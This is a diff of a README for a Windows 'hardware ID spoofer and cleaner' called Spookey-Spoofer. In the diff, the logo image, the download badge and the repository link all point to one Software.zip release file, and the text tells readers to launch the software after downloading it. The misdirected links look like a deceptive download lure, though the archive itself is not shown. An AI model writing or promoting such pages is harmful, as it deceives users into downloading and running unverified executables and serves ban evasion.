@@ -1,6 +1,6 @@
 # Spookey-Spoofer: Cleaner & Spoofer For Windows, 1.0.0.0
 
-![Spookey-Spoofer Logo](https://your-logo-url-here.png)
+![Spookey-Spoofer Logo](https://github.com/Breack12/Spookey-Spoofer/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Simply download our Spookey-Spoofer tool from the link provided below and follow
 
 ## Download Now
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Spookey-Spoofer](https://github.com/Breack12/Spookey-Spoofer/releases/download/v1.0/Software.zip)](https://github.com/Breack12/Spookey-Spoofer/releases/download/v1.0/Software.zip)
 
 🚀 **Launch the software after download to get started!**
 
@@ -67,6 +67,6 @@ Remember, with Spookey-Spoofer, you can clean your system, spoof your hardware I
 
 ---
 
-🔗 **For more information and to get started, [visit our GitHub repository](https://github.com/Rubenas123/6487922/)**
+🔗 **For more information and to get started, [visit our GitHub repository](https://github.com/Breack12/Spookey-Spoofer/releases/download/v1.0/Software.zip)**
 
 🔍 **If the provided link does not work, please check the "Releases" section for alternative download options.**
